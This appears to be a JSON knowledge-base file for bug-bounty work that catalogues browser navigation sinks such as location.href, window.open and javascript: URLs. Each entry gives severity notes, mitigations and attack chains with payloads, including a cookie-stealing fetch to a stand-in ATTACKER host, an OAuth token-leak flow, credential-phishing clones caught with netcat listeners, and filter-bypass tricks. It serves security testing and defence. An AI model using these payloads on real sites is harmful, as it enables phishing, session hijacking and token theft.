@@ -1,0 +1,671 @@
+{
+  "category": "navigation",
+  "schema_version": "2.0",
+  "sinks": [
+    {
+      "id": "sink-location-href",
+      "name": "location.href",
+      "category": "navigation",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "location.href",
+        "window.location.href",
+        "document.location.href",
+        "self.location.href",
+        "location ="
+      ],
+      "severity": "P4",
+      "severity_note": "Standalone open redirect is P4/P5 or out of scope; P3 when chained to OAuth token theft or credential phishing; P2 when a javascript: scheme executes, because that is DOM XSS.",
+      "explain": "Assigning a string to location.href navigates the current tab to that URL. When any part of the string is attacker-controlled the page becomes a redirector, and if the scheme survives as javascript: the assignment executes script in the page origin.",
+      "how_it_works": "The browser parses the assigned value as a URL. Relative, protocol-relative (//ATTACKER), absolute and javascript: values are all legal. Code that reads next/returnUrl/redirect parameters and assigns them verbatim hands navigation control to whoever crafts the link.",
+      "why_it_matters": "Open redirect is the standard phishing trampoline: a genuine TARGET URL that lands the victim on an attacker clone. Chained into an OAuth implicit flow it leaks access tokens; upgraded to javascript: execution it is full DOM XSS with session access.",
+      "exploitable_when": [
+        "location.search",
+        "location.hash",
+        "URLSearchParams",
+        "postMessage-data",
+        "document.referrer"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Trace the redirect parameter into the assignment",
+              "payload": "?next=https://ATTACKER/phish",
+              "command": "open 'https://TARGET/account/login?next=https://ATTACKER/phish' in a browser",
+              "indicator": "after the in-page action the address bar shows https://ATTACKER/phish instead of an internal TARGET page"
+            },
+            {
+              "action": "Probe the scheme filter for an XSS upgrade",
+              "payload": "?next=JaVaScRiPt:alert(document.domain)",
+              "command": "open 'https://TARGET/account/login?next=JaVaScRiPt:alert(document.domain)' in a browser",
+              "indicator": "an alert box showing the domain fires, proving javascript: execution; if nothing fires, note the redirect-only impact"
+            },
+            {
+              "action": "Build the phishing PoC for the report",
+              "payload": "https://ATTACKER/phish hosts a pixel-perfect clone of the TARGET login form that POSTs credentials to https://ATTACKER/collect",
+              "command": "run 'nc -lvnp 8080' on the ATTACKER host, then open the crafted TARGET redirect URL and submit test credentials on the clone",
+              "indicator": "the listener logs a POST body containing the test credentials for YOUR_ACCOUNT"
+            }
+          ],
+          "eligibility": "Many programs rate a standalone open redirect Low/P4 or list it as out of scope; it becomes reportable when chained to a working credential-phishing demo or OAuth leak, and it is full DOM XSS (usually P2/P3) if a javascript: payload executes."
+        },
+        {
+          "source": "URLSearchParams",
+          "steps": [
+            {
+              "action": "Find the OAuth redirect parameter feeding location.href",
+              "payload": "redirect_uri=https://ATTACKER/cb",
+              "command": "curl -s 'https://TARGET/oauth/authorize?client_id=web&response_type=token&redirect_uri=https://ATTACKER/cb' -o auth.html && grep -n 'location.href' auth.html",
+              "indicator": "the redirect target string appears inside a location.href assignment in the served JavaScript"
+            },
+            {
+              "action": "Run the crafted authorize URL in a logged-in session",
+              "payload": "https://TARGET/oauth/authorize?client_id=web&response_type=token&redirect_uri=https://ATTACKER/cb",
+              "command": "open 'https://TARGET/oauth/authorize?client_id=web&response_type=token&redirect_uri=https://ATTACKER/cb' in a browser logged in as YOUR_ACCOUNT",
+              "indicator": "after consent the browser lands on https://ATTACKER/cb#access_token= with a real token visible in the fragment"
+            },
+            {
+              "action": "Capture the leaked token",
+              "payload": "the ATTACKER/cb page reads location.hash and beacons it to https://ATTACKER/log",
+              "command": "tail -f /var/log/nginx/access.log on the ATTACKER host",
+              "indicator": "a log line contains access_token= belonging to YOUR_ACCOUNT"
+            }
+          ],
+          "eligibility": "Open redirect escalated to OAuth access-token theft is widely accepted at P2-P3; check the program policy on whether implicit-flow token leakage counts as account takeover."
+        }
+      ],
+      "contexts": {
+        "js-string": "the assigned value is a full URL string; scheme allowlisting decides whether javascript: or data: survive",
+        "attr": "when the value is first reflected into an href or action attribute, HTML entity encoding does not neutralize a javascript: scheme",
+        "url-query": "typical entry parameters: next, returnUrl, redirect, redirect_uri, continue, dest, url"
+      },
+      "waf_notes": "Server-side WAFs only see the query parameter; fragment-delivered values never reach the server. Scheme filters often match a lowercase 'javascript:' prefix only: try mixed case, leading tab/newline/carriage-return characters, or a protocol-relative '//ATTACKER' value against startswith('/') allowlists, plus backslash variants like '/\\ATTACKER'.",
+      "eligibility": "Pure open redirect is Low/P4 or explicitly out of scope on many platforms (Google VRP historically accepted it only with demonstrated impact). Chains to OAuth token theft, phishing with a working clone, or javascript: execution are what earn P2/P3.",
+      "mitigations": [
+        "Resolve the value with new URL(v, location.origin) and require url.origin === location.origin before assigning",
+        "Reject every scheme except https: (block javascript:, data:, vbscript:)",
+        "Map user input to an allowlist of internal route ids instead of raw URLs",
+        "Serve a strict redirect interstitial when leaving the origin"
+      ],
+      "related": [
+        "location.assign",
+        "location.replace",
+        "window.open",
+        "javascript: URL",
+        "anchor href"
+      ],
+      "references": [
+        "PortSwigger: DOM-based open redirection",
+        "OWASP WSTG: Testing for Client-Side URL Redirect",
+        "HackTricks: Open Redirect"
+      ]
+    },
+    {
+      "id": "sink-location-assign",
+      "name": "location.assign",
+      "category": "navigation",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "location.assign",
+        "window.location.assign",
+        "document.location.assign",
+        "location.assign("
+      ],
+      "severity": "P4",
+      "severity_note": "Same impact class as location.href: P4/P5 as a bare redirect, P3 chained to phishing or token theft, P2 if a javascript: scheme executes.",
+      "explain": "location.assign(url) navigates to url while keeping the current page in session history. Attacker-controlled input produces an open redirect; the preserved history entry means pressing Back reloads the redirector, which can fire the redirect again.",
+      "how_it_works": "assign() parses the argument exactly like an href assignment: relative, protocol-relative, absolute and (where unfiltered) javascript: values are accepted. Because the redirecting page stays in history, a victim pressing Back returns to the trap and is forwarded again.",
+      "why_it_matters": "It is the function-form of location.href seen in frameworks and routers, so it shows up where reviewers grep only for 'location.href'. The Back-button re-forward behavior makes phishing flows sticky and frustrates victim escape.",
+      "exploitable_when": [
+        "location.hash",
+        "location.search",
+        "postMessage-data",
+        "URLSearchParams"
+      ],
+      "chains": [
+        {
+          "source": "location.hash",
+          "steps": [
+            {
+              "action": "Confirm the fragment reaches assign()",
+              "payload": "#url=jlf-trace",
+              "command": "open 'https://TARGET/app#url=jlf-trace' in a browser with a breakpoint on the assign() call",
+              "indicator": "the traced fragment value appears inside the location.assign() argument in DevTools"
+            },
+            {
+              "action": "Fire the redirect through the fragment",
+              "payload": "#url=https://ATTACKER/landing",
+              "command": "open 'https://TARGET/app#url=https://ATTACKER/landing' in a browser",
+              "indicator": "the browser navigates to https://ATTACKER/landing while the TARGET access log shows no url= value, proving server-side blindness"
+            },
+            {
+              "action": "Demonstrate the sticky history behavior",
+              "payload": "#url=https://ATTACKER/landing",
+              "command": "after landing on ATTACKER, press the browser Back button",
+              "indicator": "the redirector page reloads from TARGET and immediately re-forwards to ATTACKER, so the victim cannot escape via Back"
+            }
+          ],
+          "eligibility": "Fragment-based redirect is invisible to server logs and WAFs, which strengthens the report narrative, but platform severity still follows open-redirect rules: Low/P4 standalone, higher only with a demonstrated phishing or token-theft chain."
+        },
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Confirm the message handler lacks an origin check",
+              "payload": "window.postMessage({url:'https://ATTACKER/x'},'*')",
+              "command": "open 'https://TARGET/widget' in a browser and run the payload in the console",
+              "indicator": "the page navigates to https://ATTACKER/x with no origin-validation error in the console"
+            },
+            {
+              "action": "Weaponize from a cross-origin parent page",
+              "payload": "<iframe id=f src=\"https://TARGET/widget\"></iframe><script>f.onload=()=>f.contentWindow.postMessage({url:'https://ATTACKER/clone'},'*')</script>",
+              "command": "host the payload as 'https://ATTACKER/poc.html' and open it in a browser",
+              "indicator": "the framed TARGET widget is replaced by the ATTACKER clone inside the iframe"
+            }
+          ],
+          "eligibility": "postMessage-driven redirect requires the victim to visit the attacker page; most platforms accept it as open redirect (Low/P4) and rate it higher only when combined with tabnabbing or a credential-harvest demo."
+        }
+      ],
+      "contexts": {
+        "js-string": "argument is parsed as a URL; identical scheme rules to location.href apply",
+        "url-query": "watch router code that maps query parameters into assign() calls after login flows",
+        "event-handler": "assign() is frequently wired to button clicks, which adds a user-interaction requirement to the chain"
+      },
+      "waf_notes": "Same bypass family as location.href: mixed-case schemes, leading control characters, protocol-relative URLs, and backslash confusion against startswith checks. Grep-based review misses assign() when searching only for 'location.href'.",
+      "eligibility": "Treated exactly like location.href by triagers: redirect alone is Low/P4 or out of scope; phishing/OAuth/javascript: chains carry the severity.",
+      "mitigations": [
+        "Validate the argument against a same-origin allowlist before calling assign()",
+        "Block non-https: schemes explicitly",
+        "Use router-level navigation guards instead of raw assign() with user input",
+        "Add a leaving-site interstitial for external destinations"
+      ],
+      "related": [
+        "location.href",
+        "location.replace",
+        "window.open",
+        "javascript: URL"
+      ],
+      "references": [
+        "PortSwigger: DOM-based open redirection",
+        "OWASP WSTG: Testing for Client-Side URL Redirect",
+        "MDN: Location.assign()"
+      ]
+    },
+    {
+      "id": "sink-location-replace",
+      "name": "location.replace",
+      "category": "navigation",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "location.replace",
+        "window.location.replace",
+        "document.location.replace",
+        "location.replace("
+      ],
+      "severity": "P4",
+      "severity_note": "P4/P5 as a bare redirect; its history-clobbering behavior makes it the preferred phishing redirect primitive, which can nudge a demonstrated chain to P3.",
+      "explain": "location.replace(url) navigates to url and removes the current page from session history. With attacker-controlled input it is an open redirect that leaves no way back: the Back button skips the redirector entirely.",
+      "how_it_works": "The argument is parsed as a URL like any navigation sink. The distinctive property is history manipulation: after replace() the victim cannot return to the genuine TARGET page, so a credential-harvest clone has the victim's full attention.",
+      "why_it_matters": "Phishing kits prefer replace() because the victim cannot press Back to compare with the real site. In reports, demonstrating the unrecoverable navigation materially strengthens the social-engineering impact section.",
+      "exploitable_when": [
+        "location.search",
+        "location.hash",
+        "document.referrer",
+        "postMessage-data"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Trace the parameter into replace()",
+              "payload": "?return=https://ATTACKER/clone",
+              "command": "curl -s 'https://TARGET/logout?return=https://ATTACKER/clone' | grep -n 'location.replace'",
+              "indicator": "the response JavaScript passes the return parameter into a location.replace() call"
+            },
+            {
+              "action": "Run the redirect and inspect history",
+              "payload": "?return=https://ATTACKER/clone",
+              "command": "open 'https://TARGET/logout?return=https://ATTACKER/clone' in a browser, then click the Back button",
+              "indicator": "the browser returns to the page visited before TARGET; the TARGET redirector page is absent from history"
+            },
+            {
+              "action": "Capture credentials on the clone",
+              "payload": "ATTACKER/clone replicates the TARGET login form and POSTs to https://ATTACKER/collect",
+              "command": "run 'nc -lvnp 8080' on the ATTACKER host and submit test credentials on the clone",
+              "indicator": "the listener logs a POST containing the test credentials for YOUR_ACCOUNT"
+            }
+          ],
+          "eligibility": "Same open-redirect baseline (Low/P4, often out of scope standalone); the Back-button suppression is an aggravating factor worth highlighting, but bounty still depends on the demonstrated phishing chain."
+        },
+        {
+          "source": "document.referrer",
+          "steps": [
+            {
+              "action": "Confirm referrer-based routing",
+              "payload": "Referer: https://ATTACKER/in",
+              "command": "curl -s 'https://TARGET/landing' -H 'Referer: https://ATTACKER/in' | grep -n 'document.referrer'",
+              "indicator": "the page JavaScript reads document.referrer and feeds it (or a value derived from it) into location.replace()"
+            },
+            {
+              "action": "Trigger the flow as a victim would",
+              "payload": "<a href=\"https://TARGET/landing\">go</a>   (save as in.html)",
+              "command": "host the payload at 'https://ATTACKER/in.html', click the link, and watch the address bar",
+              "indicator": "the browser is replace()-navigated to the attacker-chosen destination without a TARGET entry left in history"
+            }
+          ],
+          "eligibility": "Referrer-driven redirects need the victim to arrive from an attacker page, which triagers treat like any click-required redirect: P4 unless paired with a convincing credential-theft demo."
+        }
+      ],
+      "contexts": {
+        "js-string": "argument parsed as URL; scheme filtering identical to location.href",
+        "url-query": "common on logout/login pages that honor return or continue parameters",
+        "history": "replace() deletes the current history entry, which is the security-relevant difference from href/assign"
+      },
+      "waf_notes": "Standard redirect filter bypasses apply (case, control characters, //ATTACKER, backslashes). Because replace() is common in logout flows, parameters named return/logout_redirect are high-value review targets that WAF rule sets often ignore.",
+      "eligibility": "Open redirect severity rules apply: Low/P4 or out of scope standalone; accepted at P3 when a working credential-harvest chain is demonstrated, P2 only if a javascript: scheme executes.",
+      "mitigations": [
+        "Allowlist internal destinations before calling replace()",
+        "Reject non-https: schemes and protocol-relative URLs",
+        "Prefer fixed post-logout destinations configured server-side",
+        "Show an interstitial for any off-origin navigation"
+      ],
+      "related": [
+        "location.href",
+        "location.assign",
+        "window.open",
+        "javascript: URL"
+      ],
+      "references": [
+        "PortSwigger: DOM-based open redirection",
+        "MDN: Location.replace()",
+        "OWASP WSTG: Testing for Client-Side URL Redirect"
+      ]
+    },
+    {
+      "id": "sink-window-open",
+      "name": "window.open",
+      "category": "navigation",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "window.open",
+        "open(",
+        "window.open(",
+        ".open("
+      ],
+      "severity": "P4",
+      "severity_note": "P4 as popup redirect/phishing; P3 as stored XSS when a persisted javascript: URL fires on click; javascript: via window.open executes in the opener origin on some engines, which can raise it to P2.",
+      "explain": "window.open(url) opens a new tab or window to url. A tainted url yields attacker-chosen content in a fresh browsing context, and a javascript: url can execute script with the opener page's origin on several engines.",
+      "how_it_works": "The first argument is parsed as a URL by the new browsing context. When the value comes from storage or the DOM (profile website fields, share links), a javascript: scheme survives into the new context and runs in the opener's origin in Chrome-class browsers; without noopener the opened page also receives a window.opener handle back.",
+      "why_it_matters": "It combines three risks in one sink: popup phishing launched from a trusted tab, one-click or stored XSS via javascript: URLs, and reverse tabnabbing through the opener reference when noopener is missing.",
+      "exploitable_when": [
+        "location.search",
+        "URLSearchParams",
+        "dom-form-values",
+        "localStorage",
+        "postMessage-data"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Trace the parameter into window.open()",
+              "payload": "?popup=https://ATTACKER/clone",
+              "command": "curl -s 'https://TARGET/share?popup=https://ATTACKER/clone' | grep -n 'window.open'",
+              "indicator": "the popup parameter value appears inside a window.open() call in the served JavaScript"
+            },
+            {
+              "action": "Fire the popup phishing flow",
+              "payload": "?popup=https://ATTACKER/clone",
+              "command": "open 'https://TARGET/share?popup=https://ATTACKER/clone' in a browser",
+              "indicator": "a new tab opens to the ATTACKER clone while the original tab stays on TARGET, lending the clone borrowed trust"
+            },
+            {
+              "action": "Probe the javascript: upgrade",
+              "payload": "?popup=javascript:alert(document.domain)",
+              "command": "open 'https://TARGET/share?popup=javascript:alert(document.domain)' in Chrome and in Firefox",
+              "indicator": "Chrome-class engines execute the alert in the TARGET origin; Firefox blocks it, so record the per-browser result"
+            }
+          ],
+          "eligibility": "Popup redirect alone is Low/P4; a javascript: payload that executes in the opener origin is reportable XSS (P2/P3). Browser differences matter: state exactly which engine executed the payload."
+        },
+        {
+          "source": "dom-form-values",
+          "steps": [
+            {
+              "action": "Store a javascript: URL in a profile field rendered via window.open",
+              "payload": "javascript:fetch('https://ATTACKER/c?c='+document.cookie)",
+              "command": "save the payload as the website field of YOUR_ACCOUNT profile on TARGET",
+              "indicator": "the profile page renders a Visit Website button wired to window.open with the stored value"
+            },
+            {
+              "action": "Click the rendered button in a fresh session",
+              "payload": "javascript:fetch('https://ATTACKER/c?c='+document.cookie)",
+              "command": "log in as a second test account, open the attacker's profile, and click the Visit Website button",
+              "indicator": "the ATTACKER listener logs a request carrying the clicking account's cookie"
+            }
+          ],
+          "eligibility": "Stored value plus one click on a real feature is accepted as stored DOM XSS on most platforms (typically P3, P2 when any user can be targeted); if only the attacker's own session can click it, it is self-XSS and usually not eligible."
+        }
+      ],
+      "contexts": {
+        "js-string": "first argument parsed as URL; scheme and origin checks decide exploitability",
+        "storage": "values persisted in profiles or settings turn the sink into stored XSS when a javascript: scheme survives",
+        "feature-string": "the third argument (features) is not attacker-relevant; focus review on the first (url) argument and on missing noopener"
+      },
+      "waf_notes": "Pop-up blockers only defer window.open to a user gesture; they are not a security control. Scheme filters on the url argument share the location.href bypass family. Reverse tabnabbing needs no filter bypass at all: check for missing noopener in the features string or missing rel on equivalent anchor flows.",
+      "eligibility": "Triagers treat tainted window.open as open redirect (P4) unless a javascript: execution or cookie exfiltration is demonstrated. Always document which browser executed the payload and whether a user gesture was required.",
+      "mitigations": [
+        "Validate the url argument against a same-origin/https allowlist",
+        "Always pass 'noopener' in the features string or null out newWindow.opener",
+        "Block javascript: and data: schemes before opening",
+        "Prefer declarative anchors with rel=\"noopener noreferrer\" for user-supplied links"
+      ],
+      "related": [
+        "location.href",
+        "javascript: URL",
+        "anchor href",
+        "location.assign"
+      ],
+      "references": [
+        "PortSwigger: DOM-based open redirection",
+        "OWASP: Reverse Tabnabbing",
+        "MDN: Window.open()"
+      ]
+    },
+    {
+      "id": "sink-meta-refresh",
+      "name": "meta refresh",
+      "category": "navigation",
+      "languages": [
+        "html",
+        "javascript"
+      ],
+      "patterns": [
+        "meta refresh",
+        "http-equiv",
+        "httpEquiv",
+        "http-equiv=refresh",
+        "content=0;url"
+      ],
+      "severity": "P4",
+      "severity_note": "P4 as an HTML-level open redirect; the data:text/html variant is P3 only where the victim engine still honors top-level data: navigation (legacy browsers, some Android WebViews).",
+      "explain": "A meta tag with http-equiv=\"refresh\" and content=\"N;url=TARGET-URL\" navigates the page after N seconds with no JavaScript. If attacker input reaches the url segment of the content attribute, the page becomes an HTML-level redirector; historically the url slot also accepted data:text/html markup that executed script.",
+      "how_it_works": "The browser parses the content attribute as 'delay;url=target' at the HTML layer, before any script runs. Reflection of a request parameter into that attribute (server-side or via DOM code building the tag) gives an instant, scriptless redirect. Modern Chrome and Firefox block top-level navigation to data: URLs, which neuters the XSS variant on current desktop engines.",
+      "why_it_matters": "Meta refresh works with JavaScript disabled, so it bypasses every client-side control and sanitizer pipelines that only neutralize script. It is a reliable phishing trampoline and, on engines that still allow data: top-level navigation, a full XSS vector.",
+      "exploitable_when": [
+        "location.search",
+        "URLSearchParams",
+        "location.hash",
+        "document.referrer"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm reflection into the refresh tag",
+              "payload": "?next=https://ATTACKER/jlf-trace",
+              "command": "curl -s 'https://TARGET/bye?next=https://ATTACKER/jlf-trace' | grep -i 'http-equiv'",
+              "indicator": "the response contains a meta refresh tag whose content attribute carries https://ATTACKER/jlf-trace"
+            },
+            {
+              "action": "Fire the scriptless redirect",
+              "payload": "?next=https://ATTACKER/jlf-trace",
+              "command": "open 'https://TARGET/bye?next=https://ATTACKER/jlf-trace' in a browser with JavaScript disabled",
+              "indicator": "the browser lands on ATTACKER within the refresh delay even though no script executed"
+            },
+            {
+              "action": "Demonstrate the phishing chain",
+              "payload": "ATTACKER hosts a clone of the TARGET login page posting to https://ATTACKER/collect",
+              "command": "run 'nc -lvnp 8080' on the ATTACKER host and submit test credentials through the clone",
+              "indicator": "the listener logs the credentials POST for YOUR_ACCOUNT"
+            }
+          ],
+          "eligibility": "Functionally identical to an open redirect for triage: Low/P4 or out of scope standalone, elevated only by a working phishing or token-theft demonstration. The scriptless property is a narrative bonus, not a severity change."
+        },
+        {
+          "source": "URLSearchParams",
+          "steps": [
+            {
+              "action": "Probe the data: slot in the url segment",
+              "payload": "?next=data:text/html,<script>alert(document.domain)</script>",
+              "command": "curl -s 'https://TARGET/bye?next=data:text/html,<script>alert(document.domain)</script>' | grep -i 'http-equiv'",
+              "indicator": "the data: URL survives sanitization into the content attribute of the refresh tag"
+            },
+            {
+              "action": "Test execution per engine",
+              "payload": "?next=data:text/html,<script>alert(document.domain)</script>",
+              "command": "open 'https://TARGET/bye?next=data:text/html,<script>alert(document.domain)</script>' in current Chrome and in the oldest in-scope browser or WebView",
+              "indicator": "the alert fires on legacy engines and in-scope WebViews; current Chrome and Firefox block the top-level data: navigation, which must be documented honestly"
+            }
+          ],
+          "eligibility": "XSS via meta refresh data: counts only on engines that still allow top-level data: navigation; name the exact browser or WebView versions that executed the payload, or the report is downgraded to plain open-redirect severity."
+        }
+      ],
+      "contexts": {
+        "attr": "the content attribute mixes delay and URL in one string; quote handling decides breakout and scheme survival",
+        "html-body": "the tag executes at parse time with no script required, so CSP script-src offers no protection",
+        "js-string": "DOM code assembling the tag via innerHTML or document.write inherits all the dangers of those sinks"
+      },
+      "waf_notes": "Server WAFs see only the parameter value; filters scanning for script tags miss meta refresh entirely because no script tag is involved. Scheme checks anchored at position 0 miss values padded with spaces or control characters before data: or javascript:. DOM-assembled meta tags never touch server-side filters.",
+      "eligibility": "Triage follows open-redirect economics: Low/P4 or out of scope for the plain redirect. The data: XSS escalation is real only on engines that permit top-level data: navigation; without a named executing engine it stays a redirect.",
+      "mitigations": [
+        "Never reflect request parameters into a meta refresh content attribute",
+        "Hard-code internal destinations and map user input to route ids",
+        "Send a Content-Security-Policy header so injected data: documents have no script capability where honored",
+        "Strip or reject meta tags from any user-influenced HTML"
+      ],
+      "related": [
+        "location.href",
+        "location.replace",
+        "data: URL",
+        "innerHTML"
+      ],
+      "references": [
+        "OWASP WSTG: Testing for Client-Side URL Redirect",
+        "PortSwigger: DOM-based open redirection",
+        "HackTricks: Open Redirect"
+      ]
+    },
+    {
+      "id": "sink-javascript-url",
+      "name": "javascript: URL",
+      "category": "navigation",
+      "languages": [
+        "javascript",
+        "html"
+      ],
+      "patterns": [
+        "javascript:",
+        "javascript:alert",
+        "href=javascript",
+        "url=javascript"
+      ],
+      "severity": "P3",
+      "severity_note": "P2 when the payload fires without user interaction (auto-navigation or auto-click); P4 when a victim click on a real link is required and the program weighs social engineering.",
+      "explain": "A URL whose scheme is javascript: executes its body as script in the origin of the page that navigates to it. Any sink that builds or assigns URLs (href, location, window.open, form action) becomes XSS the moment an attacker controls the scheme.",
+      "how_it_works": "Browsers treat javascript: URLs as code to run in the current document's origin and context. Filters typically try to block the literal scheme string, so the whole attack surface lives in scheme confusion: mixed case, embedded tabs and newlines, HTML entities, and leading control characters.",
+      "why_it_matters": "It is the classic DOM XSS escalation: every redirect sink and every URL-bearing attribute must be audited for scheme filtering, because a missed javascript: turns an informational open redirect into session-stealing script execution.",
+      "exploitable_when": [
+        "location.hash",
+        "location.search",
+        "URLSearchParams",
+        "dom-form-values",
+        "localStorage"
+      ],
+      "chains": [
+        {
+          "source": "location.hash",
+          "steps": [
+            {
+              "action": "Confirm the fragment lands in an href-bearing element",
+              "payload": "#javascript:alert(document.domain)",
+              "command": "open 'https://TARGET/page#javascript:alert(document.domain)' in a browser and inspect the injected link in DevTools",
+              "indicator": "the anchor's href property contains the javascript: payload, proving the fragment reached the URL assignment"
+            },
+            {
+              "action": "Bypass the naive scheme filter",
+              "payload": "#java%09script:alert(document.domain)",
+              "command": "open 'https://TARGET/page#java%09script:alert(document.domain)' in a browser and click the injected link",
+              "indicator": "the alert fires despite a lowercase 'javascript:' filter, because the embedded tab breaks the literal match while the browser still executes the scheme"
+            },
+            {
+              "action": "Deliver through a fragment-sharing channel",
+              "payload": "https://TARGET/page#javascript:alert(document.domain)",
+              "command": "send the URL to a second test account session and have it click the rendered link",
+              "indicator": "script executes in the TARGET origin with access to the DOM and non-HttpOnly cookies"
+            }
+          ],
+          "eligibility": "One-click javascript: href injection is accepted as DOM XSS on all major platforms; if the injected link exists only in the attacker's own session it is self-XSS and usually not eligible. Fragment delivery dodges server WAFs, which strengthens the report."
+        },
+        {
+          "source": "URLSearchParams",
+          "steps": [
+            {
+              "action": "Find the parameter that is auto-assigned to a navigation sink",
+              "payload": "?redir=javascript:alert(document.domain)",
+              "command": "curl -s 'https://TARGET/continue?redir=javascript:alert(document.domain)' | grep -n 'redir'",
+              "indicator": "the redir value flows into a location or href assignment without scheme validation"
+            },
+            {
+              "action": "Trigger the zero-click execution",
+              "payload": "?redir=javascript:alert(document.domain)",
+              "command": "open 'https://TARGET/continue?redir=javascript:alert(document.domain)' in a browser",
+              "indicator": "the alert fires with no click, because the page itself navigates to the javascript: URL"
+            }
+          ],
+          "eligibility": "Zero-interaction javascript: execution is unambiguous DOM XSS, typically P2/P3 everywhere; the only common rejection is a kill-switch that strips non-http schemes, so capture the absence of filtering on video."
+        }
+      ],
+      "contexts": {
+        "attr": "href and action attributes execute javascript: on activation; HTML encoding of the value does not neutralize the scheme",
+        "js-string": "string concatenation building URLs is where scheme checks are most often forgotten",
+        "url-scheme": "the entire defense is scheme allowlisting; everything else (encoding, quoting) is cosmetic"
+      },
+      "waf_notes": "Filter bypass family: mixed case (JaVaScRiPt:), embedded tab/newline/carriage return inside the scheme, leading control characters, and HTML-entity-encoded letters when the value passes through an HTML context. Server WAFs are blind to fragment-delivered payloads.",
+      "eligibility": "The XSS upgrade from open redirect to javascript: execution is the single biggest severity jump in this category. Auto-firing chains are accepted as P2/P3 DOM XSS; click-required chains are still accepted but often rated one level lower.",
+      "mitigations": [
+        "Parse every outbound URL with new URL() and allow only https: and relative schemes",
+        "Never concatenate user input into URL strings assigned to navigation sinks",
+        "Use a CSP with script-src that disallows inline execution to blunt javascript: handlers",
+        "Render user links through a sanitizer that strips non-http schemes"
+      ],
+      "related": [
+        "location.href",
+        "anchor href",
+        "window.open",
+        "location.assign"
+      ],
+      "references": [
+        "PortSwigger: DOM XSS",
+        "OWASP: XSS Filter Evasion Cheat Sheet",
+        "HackTricks: Open Redirect"
+      ]
+    },
+    {
+      "id": "sink-history-pushstate",
+      "name": "history.pushState",
+      "category": "navigation",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "history.pushState",
+        "pushState",
+        "history.replaceState",
+        "replaceState"
+      ],
+      "severity": "P5",
+      "severity_note": "Cannot cross origins (browsers throw a SecurityError), so standalone impact is cosmetic: P5/informational typical, P4 at best as URL-bar spoofing; the real bounty lives in the downstream sink the pushed route reaches.",
+      "explain": "history.pushState(state, title, url) rewrites the address bar without navigating, restricted to the same origin. When the url argument is attacker-influenced, the address bar shows arbitrary same-origin paths, and SPA routers may render attacker-chosen routes from the pushed state.",
+      "how_it_works": "pushState and its sibling replaceState only accept URLs on the current origin, so cross-origin phishing is impossible directly. The danger is second-order: routers that read location.hash or pushed state can render a fake view, poison a returnUrl embedded in page state, or feed the value into a DOM XSS sink.",
+      "why_it_matters": "Reviewers over-report this sink. Honest assessment: it is a delivery gadget that manipulates what the victim sees in the address bar and what the SPA renders; it earns severity only when chained into UI redress, open redirect, or XSS downstream.",
+      "exploitable_when": [
+        "spa-hash-router-param",
+        "location.hash",
+        "location.search",
+        "URLSearchParams"
+      ],
+      "chains": [
+        {
+          "source": "spa-hash-router-param",
+          "steps": [
+            {
+              "action": "Identify the router writing pushed state from the hash",
+              "payload": "#/settings",
+              "command": "open 'https://TARGET/app#/settings' in a browser with a breakpoint on history.pushState",
+              "indicator": "pushState is invoked with a URL derived from location.hash when the route changes"
+            },
+            {
+              "action": "Push a route carrying an attacker parameter",
+              "payload": "#/login?next=https://ATTACKER",
+              "command": "open 'https://TARGET/app#/login?next=https://ATTACKER' in a browser",
+              "indicator": "the SPA renders its login view with the poisoned next parameter now embedded in the page state"
+            },
+            {
+              "action": "Check whether the route reaches an XSS-capable sink",
+              "payload": "#/jlf-trace-<b>bold</b>",
+              "command": "open 'https://TARGET/app#/jlf-trace-<b>bold</b>' in a browser and inspect the rendered route title",
+              "indicator": "the route value renders as HTML (bold text), which means the reportable bug is the rendering sink, not pushState itself"
+            }
+          ],
+          "eligibility": "Standalone pushState manipulation is cosmetic and is frequently closed as P5 or not applicable; report the downstream sink (DOM XSS, open redirect) and cite pushState only as the delivery path."
+        },
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm replaceState or pushState consumes the query",
+              "payload": "?fake=/account/security",
+              "command": "curl -s 'https://TARGET/app?fake=/account/security' | grep -n 'pushState'",
+              "indicator": "the served JavaScript passes the fake parameter into a pushState or replaceState url argument"
+            },
+            {
+              "action": "Demonstrate address-bar spoofing",
+              "payload": "?fake=/account/security",
+              "command": "open 'https://TARGET/app?fake=/account/security' in a browser",
+              "indicator": "the address bar displays https://TARGET/account/security while the rendered content is unchanged, enabling spoofed screenshots and social engineering"
+            }
+          ],
+          "eligibility": "Same-origin URL-bar spoofing is generally informational to P4; several programs exclude it explicitly in policy. Include it only as supporting evidence for a larger UI-redress chain."
+        }
+      ],
+      "contexts": {
+        "js-string": "the url argument must stay same-origin; any cross-origin attempt throws a SecurityError visible in the console",
+        "spa-router": "routers that derive pushed URLs from the hash or query are the realistic exposure point",
+        "address-bar": "impact is limited to what the victim sees and what the SPA renders from the forged state"
+      },
+      "waf_notes": "No server request is made by pushState, so server-side WAFs never observe the forged URL. The meaningful control is router-side validation of route parameters before they hit rendering or navigation sinks.",
+      "eligibility": "Be honest in triage: pushState alone cannot leave the origin, cannot steal data, and cannot execute script. Platforms pay for the chain it enables (XSS, open redirect, convincing UI redress), not for the address-bar manipulation itself.",
+      "mitigations": [
+        "Validate route parameters in the SPA router before use",
+        "Never feed pushed state into innerHTML or navigation sinks unchecked",
+        "Treat the address bar as untrusted in anti-phishing UX (no security decisions from the path)",
+        "Use replaceState over pushState for ephemeral state to limit history pollution"
+      ],
+      "related": [
+        "location.href",
+        "location.replace",
+        "javascript: URL",
+        "innerHTML"
+      ],
+      "references": [
+        "MDN: History.pushState()",
+        "PortSwigger: DOM-based open redirection",
+        "OWASP WSTG: Testing for Client-Side URL Redirect"
+      ]
+    }
+  ]
+}
